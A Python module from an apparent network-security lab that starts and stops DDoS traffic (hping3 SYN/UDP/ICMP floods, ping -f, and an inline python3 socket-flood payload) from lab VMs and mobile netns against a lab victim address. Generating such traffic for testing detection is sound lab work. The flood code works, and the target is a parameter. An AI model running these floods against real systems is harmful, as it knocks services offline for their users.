"""
webtool/attacks.py -- start/stop real DDoS traffic from a real source VM
against the shared victim (10.55.0.100, ENT_DC -- see inventory.py), one
mechanism per domain, each matching what that domain's own Ansible role
actually installed:

  enterprise (ent-site-N) -- hping3 (role installs it)         [SYN/UDP/ICMP]
  bgp        (peer-router) -- hping3 (role installs it)        [SYN/UDP/ICMP]
  broadband  (suscriptor)  -- simulation/bng_flood.py's own kernel-socket
                              approach (hping3 confirmed NOT to work over
                              this domain's interfaces -- see that
                              script's module docstring)         [SYN/UDP],
                              system `ping -f` for ICMP
  mobile     (ue1..5 netns) -- same kernel-socket approach as broadband,
                              run inside the UE's netns (its tun_srsue is
                              POINTOPOINT/NOARP, the same class of framing
                              mismatch that ruled out hping3 for
                              broadband) [SYN/UDP]; `ip netns exec ... ping -f`
                              for ICMP.

Every attack is launched detached (setsid+nohup) and tracked as
(node, pid) pairs in webtool_state, exactly like webtool/orchestrator.py
tracks its own Mininet-side attacks -- stop_attack() kills each PID.
"""

import shlex
from typing import List, Tuple
from uuid import uuid4

from webtool.inventory import NODES_BY_NAME, UE_NETNS, VICTIM_IP, nodes_by_domain
from webtool.ssh_ops import kill_pid, run, run_detached
from webtool.state import vmlab_state

# Kept inline (not scp'd) so no extra deployment step is needed on any
# source VM -- it's the exact same socket-level approach already proven
# to work for broadband (simulation/bng_flood.py), just embedded as a
# one-line `python3 -c` payload so it can run equally inside a UE's netns.
_PY_SYN_UDP = (
    "import socket,sys,time;"
    "proto,src,dst,port=sys.argv[1],sys.argv[2],sys.argv[3],int(sys.argv[4]);"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) if proto=='syn' else socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
    "\nif proto=='udp':\n"
    " s.bind((src,0))\n"
    " while True:\n"
    "  try: s.sendto(b'\\x00'*32,(dst,port))\n"
    "  except OSError: pass\n"
    "else:\n"
    " while True:\n"
    "  c=socket.socket(socket.AF_INET,socket.SOCK_STREAM); c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); c.setblocking(False)\n"
    "  try:\n"
    "   c.bind((src,0)); c.connect_ex((dst,port))\n"
    "  except OSError: pass\n"
    "  finally: c.close()\n"
)


def _hping3_argv(attack_type: str, target_ip: str, dst_port: int) -> str:
    if attack_type == "SYN":
        return f"hping3 -S -p {dst_port} --flood {shlex.quote(target_ip)}"
    if attack_type == "UDP":
        return f"hping3 --udp -p {dst_port or 80} --flood {shlex.quote(target_ip)}"
    return f"hping3 --icmp --flood {shlex.quote(target_ip)}"  # ICMP


def _kernel_flood_argv(attack_type: str, src_ip: str, target_ip: str, dst_port: int) -> str:
    proto = "syn" if attack_type == "SYN" else "udp"
    return (
        f"python3 -c {shlex.quote(_PY_SYN_UDP)} "
        f"{proto} {shlex.quote(src_ip)} {shlex.quote(target_ip)} {int(dst_port or 80)}"
    )


def valid_sources(domain: str) -> List[str]:
    if domain == "enterprise":
        return [n.name for n in nodes_by_domain("enterprise")]
    if domain == "bgp":
        return ["peer-router"]
    if domain == "broadband":
        return ["suscriptor"]
    if domain == "mobile":
        return [u.netns for u in UE_NETNS]
    return []


def _launch_one(node_name: str, argv: str, log_path: str, become: bool) -> Tuple[bool, str]:
    res = run_detached(node_name, argv, log_path, become=become)
    if not res.ok:
        return False, res.stderr or res.stdout
    pid = res.stdout.strip().splitlines()[-1] if res.stdout.strip() else ""
    return (pid.isdigit(), pid)


def start_attack(domain: str, source: str, attack_type: str, target_ip: str, dst_port: int) -> dict:
    target_ip = target_ip or VICTIM_IP
    attack_id = str(uuid4())
    pids: List[Tuple[str, str]] = []
    log_path = f"/tmp/webtool_attack_{attack_id[:8]}.log"

    if domain in ("enterprise", "bgp"):
        node = NODES_BY_NAME.get(source) if domain == "enterprise" else NODES_BY_NAME.get("peer-router")
        if node is None or (domain == "enterprise" and node.domain != "enterprise"):
            return {"ok": False, "error": f"fuente invalida para {domain}: {source}"}
        argv = _hping3_argv(attack_type, target_ip, dst_port)
        ok, pid_or_err = _launch_one(node.name, argv, log_path, become=True)
        if not ok:
            return {"ok": False, "error": f"no se pudo lanzar hping3 en {node.name}: {pid_or_err}"}
        pids.append((node.name, pid_or_err))

    elif domain == "broadband":
        if attack_type == "ICMP":
            argv = f"ping -f -q -W1 {shlex.quote(target_ip)}"
        else:
            # suscriptor's own MGMT IP is used as the flood's source here
            # (a specific per-subscriber macvlan IP would need discovering
            # its live DHCP lease first -- out of scope for a manual
            # webtool-triggered flood; the subscriber-agent's own
            # automatic per-session attacks already cover that path).
            argv = _kernel_flood_argv(attack_type, NODES_BY_NAME["suscriptor"].ip, target_ip, dst_port)
        ok, pid_or_err = _launch_one("suscriptor", argv, log_path, become=True)
        if not ok:
            return {"ok": False, "error": f"no se pudo lanzar el flood en suscriptor: {pid_or_err}"}
        pids.append(("suscriptor", pid_or_err))

    elif domain == "mobile":
        ue = next((u for u in UE_NETNS if u.netns == source), None)
        if ue is None:
            return {"ok": False, "error": f"UE invalido: {source}"}
        if attack_type == "ICMP":
            inner = f"ping -f -q -W1 {shlex.quote(target_ip)}"
        else:
            # src_ip 0.0.0.0 (INADDR_ANY) -- a normal, valid bind; the
            # netns's own routing table (a single tun_srsue default
            # route) picks the real source address for us.
            inner = _kernel_flood_argv(attack_type, "0.0.0.0", target_ip, dst_port)
        argv = f"ip netns exec {ue.netns} {inner}"
        ok, pid_or_err = _launch_one(ue.host, argv, log_path, become=True)
        if not ok:
            return {"ok": False, "error": f"no se pudo lanzar el flood en {ue.host}/{ue.netns}: {pid_or_err}"}
        pids.append((ue.host, pid_or_err))

    else:
        return {"ok": False, "error": f"dominio invalido: {domain}"}

    info = {
        "domain": domain, "source": source, "attack_type": attack_type,
        "target_ip": target_ip, "dst_port": dst_port, "pids": pids, "log_path": log_path,
    }
    vmlab_state.add_attack(attack_id, info)
    return {"ok": True, "attack_id": attack_id}


def stop_attack(attack_id: str) -> dict:
    info = vmlab_state.active_attacks.get(attack_id)
    if info is None:
        return {"ok": False, "error": "attack_id desconocido"}
    for node_name, pid in info.get("pids", []):
        kill_pid(node_name, pid, become=True)
        # kernel-socket flood spawns no children needing a pkill sweep;
        # hping3 --flood is the single process whose PID we captured.
    vmlab_state.remove_attack(attack_id)
    return {"ok": True}
